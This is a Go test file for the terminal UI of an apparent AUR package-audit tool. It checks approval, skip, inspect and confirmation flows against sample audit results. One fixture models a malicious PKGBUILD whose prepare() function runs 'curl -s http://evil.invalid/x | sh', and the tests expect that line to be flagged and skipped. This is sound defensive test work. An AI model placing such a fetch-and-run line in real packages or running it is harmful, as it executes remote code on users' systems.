package ui

import (
	"bytes"
	"reflect"
	"strings"
	"testing"
)

func sampleItems() []AuditItem {
	return []AuditItem{
		{
			PackageName: "ripgrep-git",
			Version:     "14.1.1-1",
			CommitSHA:   "a8c1f2e99999",
			Verdict:     VerdictSafe,
			Cached:      true,
			Summary:     "Clean Rust build from official repo.",
		},
		{
			PackageName: "visual-studio-bin",
			Version:     "1.96.0-1",
			CommitSHA:   "9d4b01a11111",
			Verdict:     VerdictWarn,
			Summary:     "Official Microsoft binary with .install hook.",
			StaticFlags: []StaticFinding{
				{Severity: "WARN", Code: "install-hook", File: "visual-studio.install", Line: 1, Message: "includes .install script"},
			},
			Reasoning: "Checked URLs and sha256sums; only updates desktop database.",
			Files: []RepoFile{
				{Path: "PKGBUILD", Content: "pkgname=visual-studio-bin\npkgver=1.96.0\n"},
			},
		},
		{
			PackageName: "helper-patch-bin",
			Version:     "1.0.2-1",
			CommitSHA:   "e31a7c922222",
			Verdict:     VerdictDangerous,
			Summary:     "Downloads and pipes remote script to sh.",
			Findings:    []string{"curl piped to sh in prepare()"},
			StaticFlags: []StaticFinding{
				{Severity: "HIGH", Code: "curl-pipe-sh", File: "PKGBUILD", Line: 18, Message: "curl piped to sh"},
			},
			Reasoning: "Clearly malicious payload.",
			Diff:      "+curl -s http://evil.invalid/x | sh\n",
			Files: []RepoFile{
				{Path: "PKGBUILD", Content: "prepare() { curl -s http://evil.invalid/x | sh; }\n"},
			},
		},
	}
}

func TestUI_ProceedSkipsDangerousByDefault(t *testing.T) {
	var out bytes.Buffer
	u := &UI{
		In:      strings.NewReader("p\n"),
		Out:     &out,
		NoColor: true,
	}

	dec, err := u.Prompt(sampleItems())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !dec.Proceed {
		t.Fatal("expected Proceed=true")
	}
	wantApproved := []string{"ripgrep-git", "visual-studio-bin"}
	wantSkipped := []string{"helper-patch-bin"}
	if !reflect.DeepEqual(dec.Approved, wantApproved) {
		t.Errorf("Approved = %v, want %v", dec.Approved, wantApproved)
	}
	if !reflect.DeepEqual(dec.Skipped, wantSkipped) {
		t.Errorf("Skipped = %v, want %v", dec.Skipped, wantSkipped)
	}

	text := out.String()
	if strings.Contains(text, "\033[") {
		t.Error("expected no ANSI codes when NoColor=true")
	}
	for _, want := range []string{
		"ripgrep-git", "SAFE (cached)", "[ok] ripgrep-git (SAFE):", "Clean Rust build from official repo.",
		"visual-studio-bin", "WARN", "[?] visual-studio-bin (WARN):",
		"helper-patch-bin", "DANGEROUS [SKIP]", "[!] helper-patch-bin (DANGEROUS):", "curl piped to sh",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("output missing %q:\n%s", want, text)
		}
	}
}

func TestUI_InspectSkipAndProceed(t *testing.T) {
	var out bytes.Buffer
	u := &UI{
		In:      strings.NewReader("i helper-patch-bin\ns visual-studio-bin\np\n"),
		Out:     &out,
		NoColor: true,
	}

	dec, err := u.Prompt(sampleItems())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !dec.Proceed {
		t.Fatal("expected Proceed=true")
	}
	wantApproved := []string{"ripgrep-git"}
	wantSkipped := []string{"visual-studio-bin", "helper-patch-bin"}
	if !reflect.DeepEqual(dec.Approved, wantApproved) {
		t.Errorf("Approved = %v, want %v", dec.Approved, wantApproved)
	}
	if !reflect.DeepEqual(dec.Skipped, wantSkipped) {
		t.Errorf("Skipped = %v, want %v", dec.Skipped, wantSkipped)
	}

	text := out.String()
	for _, want := range []string{"Clearly malicious payload.", "GIT DIFF:", "+curl -s http://evil.invalid/x | sh", "Marked visual-studio-bin as SKIPPED."} {
		if !strings.Contains(text, want) {
			t.Errorf("output missing %q:\n%s", want, text)
		}
	}
}

func TestUI_AllRequiresConfirmationForDangerous(t *testing.T) {
	t.Run("declined then quit", func(t *testing.T) {
		var out bytes.Buffer
		u := &UI{
			In:      strings.NewReader("a\nno\nq\n"),
			Out:     &out,
			NoColor: true,
		}
		dec, err := u.Prompt(sampleItems())
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if dec.Proceed {
			t.Fatal("expected Proceed=false after declining and quitting")
		}
		if !strings.Contains(out.String(), "Confirmation declined") {
			t.Errorf("expected confirmation declined message, got:\n%s", out.String())
		}
	})

	t.Run("confirmed yes", func(t *testing.T) {
		var out bytes.Buffer
		u := &UI{
			In:      strings.NewReader("a\nyes\n"),
			Out:     &out,
			NoColor: true,
		}
		dec, err := u.Prompt(sampleItems())
		if err != nil {
			t.Fatalf("unexpected error: %v", err)
		}
		if !dec.Proceed {
			t.Fatal("expected Proceed=true after confirming yes")
		}
		wantApproved := []string{"ripgrep-git", "visual-studio-bin", "helper-patch-bin"}
		if !reflect.DeepEqual(dec.Approved, wantApproved) {
			t.Errorf("Approved = %v, want %v", dec.Approved, wantApproved)
		}
		if len(dec.Skipped) != 0 {
			t.Errorf("Skipped = %v, want empty", dec.Skipped)
		}
	})
}

func TestUI_ColorOutputAndNoColorEnv(t *testing.T) {
	t.Run("ANSI enabled", func(t *testing.T) {
		var out bytes.Buffer
		u := &UI{
			In:      strings.NewReader("q\n"),
			Out:     &out,
			NoColor: false,
		}
		_, _ = u.Prompt(sampleItems())
		text := out.String()
		if !strings.Contains(text, ansiGreen) || !strings.Contains(text, ansiYellow) || !strings.Contains(text, ansiRed) {
			t.Errorf("expected green, yellow, red ANSI codes in output:\n%q", text)
		}
	})

	t.Run("NO_COLOR env respected", func(t *testing.T) {
		t.Setenv("NO_COLOR", "1")
		var out bytes.Buffer
		u := New(strings.NewReader("q\n"), &out)
		if !u.NoColor {
			t.Error("expected NoColor=true when NO_COLOR is set")
		}
	})
}

func TestUI_EOFQuitsCleanly(t *testing.T) {
	var out bytes.Buffer
	u := &UI{
		In:      strings.NewReader(""),
		Out:     &out,
		NoColor: true,
	}
	dec, err := u.Prompt(sampleItems())
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if dec.Proceed {
		t.Fatal("expected Proceed=false on EOF")
	}
}
